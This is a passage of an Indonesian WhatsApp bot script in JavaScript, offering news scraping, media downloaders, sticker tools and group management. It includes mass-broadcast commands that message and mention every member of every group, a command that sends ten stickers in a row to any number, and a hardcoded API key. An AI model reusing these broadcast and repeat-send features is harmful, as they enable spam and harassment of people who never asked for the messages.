teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
vinz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case 'inews':
iNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
replywalu(teks) 
})
break
//=================================================//
case 'okezone':
OkezoneNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
vinz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case 'sindo':
SindoNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
replywalu(teks) 
})
break
//=================================================//
case 'tempo':
TempoNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
vinz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case 'antara':
AntaraNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
vinz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case "kontan":
KontanNews().then(async (res) => {
teks = ""
no = 0
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
vinz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case "merdeka":
MerdekaNews().then(async (res) => {
teks = ""
no = 0
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
vinz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case "jalantikus":
var reis = await JalanTikusMeme()
teks = ""
teks += "Jalan Tikus Meme\n\n"
teks += `Source: ${reis}`
teks += ""
vinz.sendMessage(m.chat, { image : { url : reis }, caption: teks }, { quoted:m })
break
//=================================================
case 'faktaunik':
case 'pantun':
case 'bucin':
var { data } = await axios.get(`https://api.lolhuman.xyz/api/random/${command}?apikey=${apikey}`)
replywalu(data.result)
break
case 'quotesislam':
case 'islamquotes':
var { data } = await axios.get(`https://api.lolhuman.xyz/api/quotes/islami?apikey=${apikey}`)
replyv1(data.result)
soundnya = fs.readFileSync(`./quotes.aac`)
await sleep(100)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, seconds: 9999999999999999 }, {quoted:troli})
break
case 'katabijak':
var { data } = await axios.get(`https://api.lolhuman.xyz/api/random/${command}?apikey=${apikey}`)
replywalu(data.result)
soundnya = fs.readFileSync(`./akatsuki.m4a`)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, duration: 2159 }, {quoted:m})
break
case 'jadwaltv':
if (args.length == 0) return replywalu(`Example: ${prefix + command} RCTI`)
var { data } = await axios.get(`https://api.lolhuman.xyz/api/jadwaltv/${full_args}?apikey=${apikey}`)
var txtayaj = `Jadwal TV ${args[0].toUpperCase()}\n`
for (var x in data.result) {
txtayaj += `${x} - ${data.result[x]}\n`
}
replywalu(txtayaj)
break
case 'jadwaltvnow':
var { data } = await axios.get(`https://api.lolhuman.xyz/api/jadwaltv/now?apikey=${apikey}`)
var txtayajas = `Jadwal TV Now :\n`
for (var x in data.result) {
txtayajas += `${x.toUpperCase()}${data.result[x]}\n\n`
}
replywalu(txtayajas)
break
//=================================================
case 'cerpen':
var { data } = await axios.get(`https://api.lolhuman.xyz/api/cerpen?apikey=${apikey}`)
var textpp = `Title : ${data.result.title}\n`
textpp += `Creator : ${data.result.creator}\n`
textpp += `Story :\n${data.result.cerpen}`
replywalu(textpp)
break
case 'infogempa':
var { data } = await axios.get(`https://api.lolhuman.xyz/api/infogempa?apikey=${apikey}`)
var caption = `Lokasi : ${data.result.lokasi}\n`
caption += `Waktu : ${data.result.waktu}\n`
caption += `Potensi : ${data.result.potensi}\n`
caption += `Magnitude : ${data.result.magnitude}\n`
caption += `Kedalaman : ${data.result.kedalaman}\n`
caption += `Koordinat : ${data.result.koordinat}`
vinz.sendMessage(m.chat, { image: { url: data.result.map }, caption })
break
case 'cuaca':
if (args.length == 0) return replywalu(`Example: ${prefix + command} Yogyakarta`)
var { data } = await axios.get(`https://api.lolhuman.xyz/api/cuaca/${full_args}?apikey=${apikey}`)
var textppp = `Tempat : ${data.result.tempat}\n`
textppp += `Cuaca : ${data.result.cuaca}\n`
textppp += `Angin : ${data.result.angin}\n`
textppp += `Description : ${data.result.description}\n`
textppp += `Kelembapan : ${data.result.kelembapan}\n`
textppp += `Suhu : ${data.result.suhu}\n`
textppp += `Udara : ${data.result.udara}\n`
textppp += `Permukaan laut : ${data.result.permukaan_laut}\n`
vinz.sendMessage(m.chat, { location: { degreesLatitude: data.result.latitude, degreesLongitude: data.result.longitude } })
replywalu(textppp)
break
case "sticker": case 's': case 'stiker':
{
if (!isCreator && global.db.data.users[m.sender].limit < 1) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1
                replyv1(`🚩 1 Limit Used`)
try{
if(isQuotedVideo || isQuotedImage ){
FileLink = ''
Ale = ''
if(isQuotedImage) { 
FileLink = await getFileDownload(mQuotedMsg.imageMessage, "image")
Ale = await getRandom('.jpg')
}
if(isQuotedVideo){ 
if(parseFloat(mQuotedMsg.videoMessage.seconds) > 10) return replywalu('Hanya video dengan durasi maksimal 9 detik')
FileLink = await getFileDownload(mQuotedMsg.videoMessage, "video")
Ale = await getRandom('.mp4')
}
const media = (`./${Ale}`)
await writeFile(media, FileLink)
ran = `${await getRandom('.webp')}`

try{
exec(`ffmpeg -i ${media} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 320:320 ${ran}`, async (err) => {
if(err){
  console.log(err)
  await replywalu("Kesalahan, coba lagi")
  await fs.unlinkSync(media)
  return
}
try{
await	vinz.sendMessage(m.chat,{ sticker: {url:  `./${ran}`} }, {quoted: fkontak})
} catch(err) {
  console.log(err)
return replywalu( "Kesalahan, coba lagi")
await fs.unlinkSync(media)
await fs.unlinkSync(ran)
return
}
await fs.unlinkSync(media)
await fs.unlinkSync(ran)
return
})
} catch (err) {
  console.log(err)
 return replywalu( "Kesalahan, coba lagi")
}
} else {
return replywalu(`*Anda perlu mengirim atau menandai foto/video tidak lebih dari 10 detik.*`)
}
} catch(err) {
  console.log(err)
return replywalu(`Tidak dapat membuat stiker, coba lagi sebentar lagi.`)
}
break
}
case 'attp':
case 'attp2':
if (!isCreator && global.db.data.users[m.sender].limit < 5) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 5
                replyv1(`🚩 5 Limit Used`)
if (args.length == 0) return replywalu('Teksnya Mana Bjir?')
ini_txt = args.join(" ")
ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/${command}?apikey=${apikey}&text=${ini_txt}`)
vinz.sendMessage(m.chat, { sticker : ini_buffer }, { quoted:fkontak })
break
case 'bcgc': case 'bcgroup': {
if (!isAuthor) return replyv1('*Khusus Author*')
await loading()
if (!dtext) return replywalu(`Text mana?\n\nExample : ${prefix + command} fatih-san`)
let getGroups = await vinz.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
for (let i of anu) {
await sleep(1500)
vinz.sendMessage(i, {text: `${dtext}`}, {quoted:fkontak})
    }
reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break
case 'google': {
 if (!dtext) return replywalu(`Example : ${prefix + command} fatih arridho`)
let google = require('google-it')
google({'query': dtext}).then(res => {
let teks = `Google Search From : ${dtext}\n\n`
for (let g of res) {
teks += `⭔ *Title* : ${g.title}\n`
teks += `⭔ *Description* : ${g.snippet}\n`
teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
reply(teks)
})
}
break
case 'tiktokvideo': case 'tiktok': case 'tt':{
if (!isCreator && global.db.data.users[m.sender].limit < 5) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 5
                replyv1(`🚩 5 Limit Used`)
if (!dtext) return reply( `Example : ${prefix + command} link`)
if (!dtext.includes('tiktok')) return reply(`Link Invalid!!`)
require('./lib/tiktok').Tiktok(dtext).then( data => {
vinz.sendMessage(m.chat, { video: { url: data.nowm }}, { quoted: m })
})
}
break
//=================================================
case 'tiktokmp3': case 'ttmp3':
case 'tiktokaudio':{
if (!isCreator && global.db.data.users[m.sender].limit < 5) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 5
                replyv1(`🚩 5 Limit Used`)
if (!dtext) return reply( `Example : ${prefix + command} link`)
if (!dtext.includes('tiktok')) return reply(`Link Invalid!!`)
require('./lib/tiktok').Tiktok(dtext).then( data => {
vinz.sendMessage(m.chat, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })
})
}
break
case 'yts': case 'ytsearch': {
if (!isCreator && global.db.data.users[m.sender].limit < 5) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 5
                replyv1(`🚩 5 Limit Used`)
if (!dtext) throw `Example : ${prefix + command} story wa anime`
let search = await yts(dtext)
let teks = '*YouTube Search*\n\n Result From '+dtext+'\n\n'
let no = 1
for (let i of search.all) {
teks += `⭔ No : ${no++}\n⭔ Type : ${i.type}\n⭔ Video ID : ${i.videoId}\n⭔ Title : ${i.title}\n⭔ Views : ${i.views}\n⭔ Duration : ${i.timestamp}\n⭔ Upload At : ${i.ago}\n⭔ Url : ${i.url}\n\n─────────────────\n\n`
}
vinz.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
}
break
//=================================================
case 'ytmp3': case 'youtubemp3': {
if (!isCreator && global.db.data.users[m.sender].limit < 5) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 5
                replyv1(`🚩 5 Limit Used`)
if (!dtext) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
downloadMp3(dtext)
}
break
//=================================================
case 'ytmp4': case 'youtubemp4':
if (!isCreator && global.db.data.users[m.sender].limit < 5) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 5
                replyv1(`🚩 5 Limit Used`)
			if (args.length == 0) return reply(`Example: ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27`)
			axios.get(`https://api.lolhuman.xyz/api/ytvideo2?apikey=${apikey}&url=${full_args}`)
				.then(({ data }) => {
					var caption = `❖ Title    : *${data.result.title}*\n`
					caption += `❖ Size     : *${data.result.size}*`
					vinz.sendMessage(m.chat, { image: { url: data.result.thumbnail }, caption }).then(() => {
						vinz.sendMessage(m.chat, { video: { url: data.result.link }, mimetype: 'video/mp4', fileName: `${data.result.title}.mp4` })
					})
				})
			break
			case 'remini': case 'hd': case 'hdr': {
			if (!isCreator && global.db.data.users[m.sender].limit < 5) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 5
                replyv1(`🚩 5 Limit Used`)
if (!quoted) return reply(`Fotonya Mana?`)
if (args.length == 1) return reply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
let media = await quoted.download()
let proses = await remini(media, "enhance");
await loading()
await sleep(1000)
vinz.sendMessage(m.chat, { image: proses, caption: 'Done Ya'}, { quoted: floc})
}
break
case 'setppbot': {
if (!isAuthor) return replyv1('*Khusus Author*')
if (!quoted) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (args.length == 1) return reply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
let media = await vinz.downloadAndSaveMediaMessage(quoted)
await vinz.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
reply("Done")
}
break
case 'pppanjang': case 'setppbot2':{
if (!isCreator) return replyv1('Fitur Khusus owner!')
if (!quoted) return replyv1(`Reply foto dgn caption ${prefix + command}`)
if (!/image/.test(mime)) return replyv1(`Reply foto dgn caption ${prefix + command}`)
if (/webp/.test(mime)) return replyv1(`Reply foto dgn caption ${prefix + command}`)
let media = await vinz.downloadAndSaveMediaMessage(quoted)
var { img } = await generateProfilePicture(media)
await vinz.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
} 
]
})
replyv1("Done!!!")
}
break
case 'inspect':{
if (!isAuthor) return replyv1('*Khusus Author*')
if (!dtext) return reply('Link?')
let linkRegex = args.join(" ")
let coded = linkRegex.split("https://chat.whatsapp.com/")[1]
if (!coded) return reply("Link Invalid")
vinz.query({
tag: "iq",
attrs: {
type: "get",
xmlns: "w:g2",
to: "@g.us"
},
content: [{ tag: "invite", attrs: { code: coded } }]
}).then(async(res) => { 
tekse = `「 Group Link Yang Di Inspect 」
▸ Nama Group : ${res.content[0].attrs.subject ? res.content[0].attrs.subject : "undefined"}

▸ Deskripsi Di Ubah : ${res.content[0].attrs.s_t ? moment(res.content[0].attrs.s_t *1000).tz("Asia/Jakarta").format("DD-MM-YYYY, HH:mm:ss") : "undefined"}
▸ Pembuat Group : ${res.content[0].attrs.creator ? "@" + res.content[0].attrs.creator.split("@")[0] : "undefined"}
▸ Group Di Buat : ${res.content[0].attrs.creation ? moment(res.content[0].attrs.creation * 1000).tz("Asia/Jakarta").format("DD-MM-YYYY, HH:mm:ss") : "undefined"}
▸ Total Member : ${res.content[0].attrs.size ? res.content[0].attrs.size : "undefined"} Member

▸ ID Group  : ${res.content[0].attrs.id ? res.content[0].attrs.id : "undefined"}

©By ${botname}`
try {
pp = await vinz.profilePictureUrl(res.content[0].attrs.id + "@g.us", "image")
} catch {
pp = "https://tse2.mm.bing.net/th?id=OIP.n1C1oxOvYLLyDIavrBFoNQHaHa&pid=Api&P=0&w=153&h=153"
}
vinz.sendFile(m.chat, pp, "", m, { caption: tekse, mentions: await vinz.parseMention(tekse) })

})
}
break
case 'enc': {
if (!isAuthor) return replyv1('*Khusus Author*')
if (!dtext) return reply(`Contoh ${prefix+command} const xyz = require('xyz-api')`)
let meg = await obfus(dtext)
replywalu(`${meg.result}`)
}
break
case "spotify": {
                if (!/(?:https?:\/\/)?(?:open\.)?spotify.com(?:\/[a-zA-Z0-9\-]+)?\/track\//i.test(m.text)) return reply(`Example : ${prefix + m.command} https://open.spotify.com/track/3W4U7TEgILGpq0EmquurtH`)
                await reply("wait")
                let req = await (await api("xfarr")).get(`/api/download/spotify`, { url: Func.isUrl(m.text)[0] }, "${apikey}", { responseType: "arraybuffer" })
                if (req?.status && req.status !== 200) return reply(req?.message || "error")
                await reply(req)
            }
            break
            case 'getmusic': {
if (!isAuthor) return replyv1('*Khusus Author*')
if (dtext) throw `Example : ${prefix + command} 1`
if (!m.quoted) return reply('Reply Pesan')
if (!m.quoted.isBaileys) throw `Hanya Bisa Membalas Pesan Dari Bot`
let urls = quoted.dtext.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
if (!urls) throw `Mungkin pesan yang anda reply tidak mengandung result ytsearch`
downloadMp3(urls[text - 1])
}
break
case "darkjoke": case "darkjokes":
 var ress = await Darkjokes()
teks = "*Darkjokes*"
vinz.sendMessage(m.chat, { image : { url : ress }, caption: teks }, { quoted:qpay })
break
case "ytreels": case "youtubereels":{
if (!isAuthor) return replyv1('*Khusus Author*')
if (!dtext) return reply('Masukan Link Nya!!!')
downloadMp4(dtext)
}
break
case 'igvideo': case 'igreels':
			if (args.length == 0) return reply(`Example: ${prefix + command} https://www.instagram.com/tv/CXwPLSIFDW0/?igshid=NTc4MTIwNjQ2YQ==`)
			axios.get(`https://api.lolhuman.xyz/api/instagram?apikey=${apikey}&url=${full_args}`).then(({ data }) => {
				vinz.sendMessage(m.chat, { video: { url: data.result }, mimetype: 'video/mp4', caption : `Done Type Video😁`})
			})
			break
case 'toimage': case 'toimg': {
if (!isCreator && global.db.data.users[m.sender].limit < 1) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1
                replyv1(`🚩 1 Limit Used`)
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
let media = await vinz.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.jpg')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
vinz.sendMessage(m.chat, { image: buffer }, {quoted:m})
fs.unlinkSync(ran)
})
}
break
case 'wm': {
if (!isCreator && global.db.data.users[m.sender].limit < 1) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1
                replyv1(`🚩 1 Limit Used`)
let dteks = `${dtext}`
{
 if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await vinz.sendImageAsSticker(m.chat, media, m, { packname: `${dteks}`, author: `${botname}` })
await fs.unlinkSync(encmedia)
}
}
}
break
case "quotes":
 var resi = await Quotes()
teks = `\nAuthor: ${resi.author}\n`
teks = `\nQuotes:\n`
teks = `${resi.quotes}\n`
replyz(teks)
break
case 'qp':
if (!args[0]) return replywalu(`Masukan Nomer Pembeli ${prefix+command} nomor\nContoh ${prefix+command} 628888889699`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : dtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
await sleep(12)
vinz.sendMessage(Pe, { sticker : xxtmages }, { quoted:qpay })
await sleep(1000)
vinz.sendMessage(Pe, { sticker : xxtmages }, { quoted:qpay })
await sleep(55)
vinz.sendMessage(Pe, { sticker : xxtmages }, { quoted:qpay })
await sleep(2000)
vinz.sendMessage(Pe, { sticker : xxtmages }, { quoted:qpay })
await sleep(20)
vinz.sendMessage(Pe, { sticker : xxtmages }, { quoted:qpay })
await sleep(123)
vinz.sendMessage(Pe, { sticker : xxtmages }, { quoted:qpay })
await sleep(1000)
vinz.sendMessage(Pe, { sticker : xxtmages }, { quoted:qpay })
await sleep(1)
vinz.sendMessage(Pe, { sticker : xxtmages }, { quoted:qpay })
await sleep(55)
vinz.sendMessage(Pe, { sticker : xxtmages }, { quoted:qpay })
await sleep(900)
vinz.sendMessage(Pe, { sticker : xxtmages }, { quoted:qpay })
await sleep(10000)
replyz(`Done Kaks`)
break
case 'leave': {
if (!isAuthor) return replyv1(mess.Author)
                await vinz.groupLeave(m.chat)
                await reply(`Done Tuan✅`)
            }
            break
case 'setbotname':{
if (!isAuthor) return replyv1(mess.Author)
if (!dtext) return reply(`Dimana Namanya Tuan?\nExample: ${prefix + command} Vinz X7`)
    await vinz.updateProfileName(dtext)
    reply(`Berhasil Mengubah Nama Bot Tuan✅`)
    }
    break
case 'setbotbio':{
if (!isAuthor) return replyv1(mess.Author)
if (!dtext) return reply(`Dimana Textnya Tuan?\nExample: ${prefix + command} Vinz X7`)
    await vinz.updateProfileStatus(dtext)
    reply(`Berhasil Mengubah Bio Nomor Bot Tuan✅`)
    }
    break
    case "creategc":{
if (!isCreator && global.db.data.users[m.sender].limit < 2000) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 2000
                replyv1(`🚩 2000 Limit Used`)
if (!dtext) return reply("Nama groupnya Tuan?")
let cret = await vinz.groupCreate(dtext, [])
let response = await vinz.groupInviteCode(cret.id)
let teks = `\`\`\`「  CREATION GROUP MESSAGE  」\`\`\`

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB
▸ Link : https://chat.whatsapp.com/${response}
`
setTimeout(() => {
reply(teks) 
}, 7000)
setTimeout(() => {
vinz.groupParticipantsUpdate(cret.id, [m.sender], "promote")
}, 5000)
setTimeout(() => {
vinz.groupParticipantsUpdate(cret.id, [m.sender], "add")
}, 1000)
}
break
case 'setppgroup': {
if (!isAuthor) return replyv1(mess.Author)
if (!m.isGroup) return replywalu(mess.group)
if (!isBotGroupAdmins) return replywalu(mess.botAdmin)
if (!isGroupAdmins) return replywalu('Lah Dikira Admin Group Kali')
if (!quoted) return reply(`*Where is the picture?*`)
if (!/image/.test(mime)) return replyv1(`\`\`\`Send/Reply Image With Caption\`\`\` *${prefix + command}*`)
if (/webp/.test(mime)) return replyv1(`\`\`\`Send/Reply Image With Caption\`\`\` *${prefix + command}*`)
var mediz = await vinz.downloadAndSaveMediaMessage(quoted, 'ppgc.jpeg')
if (args[0] == `full`) {
var { img } = await generateProfilePicture(mediz)
await vinz.query({
tag: 'iq',
attrs: {
to: m.chat,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(mediz)
reply(`*Success Tuan Ku✅*`)
} else {
var memeg = await vinz.updateProfilePicture(m.chat, { url: mediz })
fs.unlinkSync(mediz)
reply(`*Success Tuan Ku✅*`)
}
}
break
case "jpm": case "jpm2":{
if (!isAuthor) return replyv1(mess.Author)
if (!dtext) return reply(`*Penggunaan Salah Silahkan Gunakan Seperti Ini*\n${prefix+command} teks|jeda\n\nReply Gambar Untuk Mengirim Gambar Ke Semua Group\nUntuk Jeda Itu Delay Jadi Nominal Jeda Itu 1000 = 1 detik`)
await replyv1("_Wait Tuan Ku✅_")
let getGroups = await vinz.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await vinz.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await vinz.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await vinz.sendMessage(xnxx, { image: { url: mem }, caption: dtext.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(dtext.split('|')[1])
} else {
await vinz.sendMessage(xnxx, { text: dtext.split('|')[0], mentions: participants.map(a => a.id) })
await sleep(dtext.split('|')[1])
}}
reply("*SUCCESFUL TUAN✅*")
}
break
case 'deleteppgroup': case 'delppgc': case 'deleteppgc': case 'delppgroup': {
if (!isAuthor) return replyv1(mess.Author)
if (!m.isGroup) return replywalu(mess.group)
if (!isBotGroupAdmins) return replywalu(mess.botAdmin)
if (!isGroupAdmins) return replywalu('Lah Dikira Admin Group Kali')
    await vinz.removeProfilePicture(m.chat)
    }
    break
    case 'setppbot': case 'setbotpp': {
if (!isAuthor) return replyv1(mess.Author)
if (!quoted) return replyv1(`\`\`\`Send/Reply Image With Caption\`\`\` *${prefix + command}*`)
if (!/image/.test(mime)) return replyv1(`\`\`\`Send/Reply Image With Caption\`\`\` *${prefix + command}*`)
if (/webp/.test(mime)) return replyv1(`\`\`\`Send/Reply Image With Caption\`\`\` *${prefix + command}*`)
var medis = await vinz.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `full`) {
var { img } = await generateProfilePicture(medis)
await vinz.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
reply(`*Success Tuan Ku✅*`)
} else {
var memeg = await vinz.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
reply(`*Success Tuan Ku✅*`)
}
}
break
case 'toaudio': case 'audio': {
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
let media = await vinz.downloadMediaMessage(quoted)
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
vinz.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
}
break
//=================================================//
case 'tovn': case 'voice': {
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
if (!quoted) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
replyv1('*Sabar Cuy Loading*')
let media = await quoted.download()
let { toPTT } = require('./lib/converter')
let audio = await toPTT(media, 'mp4')
vinz.sendMessage(from, {audio: audio, mimetype:'audio/mpeg', ptt:true, contextInfo:{  externalAdReply: { showAdAttribution: true,
mediaType:  1,
mediaUrl: 'https://wa.me/6281214281312',
title: `HW MODS WA`,
sourceUrl: `https://wa.me/6281214281312`, 
thumbnail: thumb
}
}})
}
break
case 'viewonce':
  { 
joauuuuuuu = fs.readFileSync('./media/video/vinzx7.mp4')
vinz.sendMessage(m.chat, {video: joauuuuuuu, caption:`Bukan Apa-Apa Deck`,viewOnce : true},{quoted: troli})
}
break
case 'sangecek':
case 'ceksange':
case 'gaycek':
case 'cekgay':
case 'cekganteng':
case 'cekcantik':
case 'cekkaya':
case 'lesbicek':
case 'ceklesbi': {
if (!dtext) return replyv1(`Penggunaan ${command} Nama\n\nContoh : ${prefix + command} ${pushname}`)
var sangek = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
var sange = sangek[Math.floor(Math.random() * sangek.length)]
replyv1(`Nama : ${dtext}\nJawaban : *${sange}%*`)
}
break
case'removebg':
            case 'nobg': {
            if (!isCreator && global.db.data.users[m.sender].limit < 15) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 15
                replyv1(`🚩 15 Limit Used`)
                if (!isMedia) return replyv1("Where The A Image")
                let media = await vinz.downloadAndSaveMediaMessage(quoted)
                let anu = await uptotelegra(media)
                vinz.sendMessage(m.chat, {
                    image: {
                        url: `https://api.lolhuman.xyz/api/removebg?apikey=${apikey}&img=${anu}`
                    },
                    caption: "Done Kak"
                }, {
                    quoted: m
                })
            }
            break
            case 'tourl': {
    replyv1(mess.wait)
    let media = await vinz.downloadAndSaveMediaMessage(quoted)
    if (/image/.test(mime)) {
        let anu = await uptotelegra(media)
        replyv1(util.format(anu))
    } else if (!/image/.test(mime)) {
        let anu = await UploadFileUgu(media)
        replyv1(util.format(anu))
    }
    await fs.unlinkSync(media)
    
}
break
case 'randomcogan': {
result = await getBuffer(`https://api.xyroinee.xyz/api/cogan/random?apikey=NjOgoMkCjw`)
vinz.sendMessage(m.chat, {image: result, mimetype: 'image/png'}, {quoted:m})
}
break
case 'done':{
if (!isCreator) return replyv1(mess.owner)
let t = dtext.split(',');
if (t.length < 3) return replyv1(`*Format salah!*

Penggunaan:
${prefix + command} barang,nominal,nomer`);
let barang = t[0];
let nominal = t[1];
let nomer = t[2];
vinz.sendMessage(nomer+'@s.whatsapp.net', {text: `*━━ TRANSAKSI INFO ━━*

 _• *Barang:* ${barang}_
 _• *Nominal:* Rp ${nominal}_
 _• *Tanggal:* ${calender}_

*TERIMA KASIH TELAH ORDER DI Vinz X7*\n*JANGAN LUPA ORDER LAGI YA*🙏`}, {quoted:troli})
}
        break
        case "batal": {
        if (!isCreator) return replyv1(mess.owner)
        Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : dtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
        if (!args[0]) return replyv1(`Contoh ${prefix+command} 628888889699`)
const owned = `${ownNumb}@s.whatsapp.net`
vinz.sendMessage(Pe+'@s.whatsapp.net', {text: `*Hi @${Pe.split("@")[0]} 👋*

▭▬▭( *𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗕𝗔𝗧𝗔𝗟* )▭▬▭

📆 𝗧𝗮𝗻𝗴𝗴𝗮𝗹: ${calender}
🕰️ 𝗪𝗮𝗸𝘁𝘂: ${moment.tz('Asia/Jakarta').format('HH:mm:ss')}
✨ 𝗦𝘁𝗮𝘁𝘂𝘀: Batal

𝗦𝗲𝗹𝘂𝗿𝘂𝗵 𝗧𝗿𝗮𝗻𝘀𝗮𝗸𝘀𝗶 𝗕𝗮𝘁𝗮𝗹

 Powered By *@${owned.split("@")[0]}*
